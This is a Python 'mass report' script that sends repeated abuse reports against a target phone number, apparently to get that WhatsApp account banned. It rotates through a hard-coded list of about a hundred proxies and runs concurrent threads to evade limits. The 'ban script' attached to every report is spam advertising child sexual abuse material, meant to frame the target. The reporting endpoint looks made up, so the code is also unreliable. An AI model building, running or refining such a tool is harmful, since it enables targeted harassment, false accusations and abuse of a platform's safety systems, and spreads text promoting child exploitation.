import requests
import time
import random
from concurrent.futures import ThreadPoolExecutor

ban_scripts = [
    "🔥👅Unete al mejor grupo🍆con todos los👉🏿👊🏾💦 Packs CP y MORRITAS😋EN LÍNEA para😈 tener chat 💯🔥 y video llamada🔥🥵 AHORA⬇️⬇️⬇️⬇️⬇️⬇️⬇️ https://wlhatt.life/morritas-cp/+97256-883-8088P",
    # Add more ban scripts here if needed
]

# User-provided proxies
proxies = [
    "http://156.233.91.192:3129",
    "http://156.242.36.219:3129",
    "http://156.228.174.218:3129",
    "http://156.228.83.109:3129",
    "http://156.233.84.62:3129",
    "http://156.228.102.70:3129",
    "http://156.228.105.23:3129",
    "http://45.201.11.143:3129",
    "http://156.228.78.208:3129",
    "http://154.213.199.76:3129",
    "http://156.228.171.12:3129",
    "http://156.253.173.234:3129",
    "http://156.228.184.79:3129",
    "http://156.228.190.227:3129",
    "http://156.253.175.161:3129",
    "http://156.228.89.143:3129",
    "http://156.253.171.136:3129",
    "http://156.228.119.163:3129",
    "http://156.228.181.57:3129",
    "http://156.228.184.234:3129",
    "http://156.228.115.207:3129",
    "http://156.240.99.46:3129",
    "http://156.228.87.98:3129",
    "http://154.213.193.144:3129",
    "http://156.233.95.197:3129",
    "http://156.228.116.45:3129",
    "http://156.228.111.98:3129",
    "http://154.213.199.210:3129",
    "http://45.201.10.64:3129",
    "http://156.242.34.213:3129",
    "http://156.228.190.109:3129",
    "http://156.233.92.197:3129",
    "http://156.233.90.129:3129",
    "http://156.249.56.75:3129",
    "http://156.228.91.136:3129",
    "http://156.228.105.189:3129",
    "http://156.228.93.14:3129",
    "http://156.248.83.236:3129",
    "http://154.213.193.127:3129",
    "http://156.233.94.119:3129",
    "http://156.228.171.65:3129",
    "http://156.228.91.27:3129",
    "http://156.233.91.29:3129",
    "http://154.213.167.31:3129",
    "http://156.228.104.45:3129",
    "http://156.233.93.254:3129",
    "http://156.228.177.142:3129",
    "http://156.228.171.35:3129",
    "http://156.228.189.205:3129",
    "http://156.242.33.37:3129",
    "http://45.202.79.5:3129",
    "http://156.228.85.240:3129",
    "http://156.242.42.195:3129",
    "http://156.228.86.199:3129",
    "http://156.242.35.138:3129",
    "http://156.249.56.145:3129",
    "http://156.253.179.127:3129",
    "http://156.228.116.30:3129",
    "http://156.228.98.182:3129",
    "http://156.242.34.111:3129",
    "http://156.228.87.41:3129",
    "http://154.213.198.84:3129",
    "http://156.249.63.95:3129",
    "http://156.233.75.107:3129",
    "http://156.233.89.121:3129",
    "http://154.213.198.115:3129",
    "http://156.233.92.58:3129",
    "http://156.228.81.107:3129",
    "http://156.228.84.175:3129",
    "http://156.242.41.76:3129",
    "http://156.228.184.66:3129",
    "http://156.228.79.79:3129",
    "http://156.242.34.158:3129",
    "http://154.213.198.17:3129",
    "http://156.248.82.173:3129",
    "http://156.233.72.79:3129",
    "http://156.248.87.229:3129",
    "http://156.242.46.184:3129",
    "http://156.228.182.176:3129",
    "http://156.228.96.55:3129",
    "http://156.233.95.108:3129",
    "http://45.202.78.197:3129",
    "http://156.253.179.99:3129",
    "http://156.228.116.61:3129",
    "http://156.242.39.46:3129",
    "http://156.233.95.36:3129",
    "http://156.228.112.162:3129",
    "http://156.228.101.47:3129",
    "http://156.233.72.29:3129",
    "http://156.253.166.19:3129",
    "http://156.233.90.71:3129",
    "http://156.228.104.183:3129",
    "http://156.228.174.149:3129",
    "http://154.213.160.143:3129",
    "http://156.253.174.135:3129",
    "http://154.213.162.221:3129",
    "http://156.253.167.141:3129",
    "http://156.228.81.221:3129",
    "http://156.228.91.72:3129",
    "http://156.253.171.144:3129"
]

current_proxy_index = 0

def get_proxy():
    global current_proxy_index
    proxy_url = proxies[current_proxy_index]
    current_proxy_index = (current_proxy_index + 1) % len(proxies)
    
    # requests library automatically handles http, https, socks4, socks5 prefixes
    return {
        'http': proxy_url,
        'https': proxy_url
    }

def send_report(target, proxy, script, report_num):
    try:
        response = requests.post(
            'https://api.whatsapp.com/v1/report',
            json={'target': target, 'reason': 'inappropriate', 'message': script},
            headers={'User-Agent': 'WhatsApp/2.25.7 Android/14'},
            proxies=proxy,
            timeout=10 # Add a timeout for requests
        )
        response.raise_for_status() # Raise an exception for HTTP errors
        print(f"Report {report_num} sent to {target} successfully using proxy {proxy['http']}")
    except requests.exceptions.RequestException as e:
        print(f"Report {report_num} failed for {target} using proxy {proxy['http']}: {e}")
    except Exception as e:
        print(f"An unexpected error occurred for report {report_num}: {e}")

def mass_report(target, report_count, delay, num_threads=5):
    with ThreadPoolExecutor(max_workers=num_threads) as executor:
        futures = []
        for i in range(report_count):
            proxy = get_proxy()
            script = random.choice(ban_scripts)
            futures.append(executor.submit(send_report, target, proxy, script, i + 1))
            time.sleep(delay)  # Delay between submitting tasks
        
        # Wait for all futures to complete (optional, but good for seeing all results)
        for future in futures:
            future.result()

if __name__ == "__main__":
    target = input("Give ripper a target number (e.g., +91346258900): ")
    try:
        report_count = int(input("Enter number of reports to send (e.g., 50): "))
        delay = float(input("Enter delay between reports in seconds (e.g., 0.5 for faster, 5 for slower): "))
        num_threads = int(input("Enter number of concurrent threads (e.g., 5): "))
    except ValueError:
        print("Invalid input. Using default values: 50 reports, 0.5 seconds delay, 5 threads.")
        report_count = 50
        delay = 0.5
        num_threads = 5
    mass_report(target, report_count, delay, num_threads)
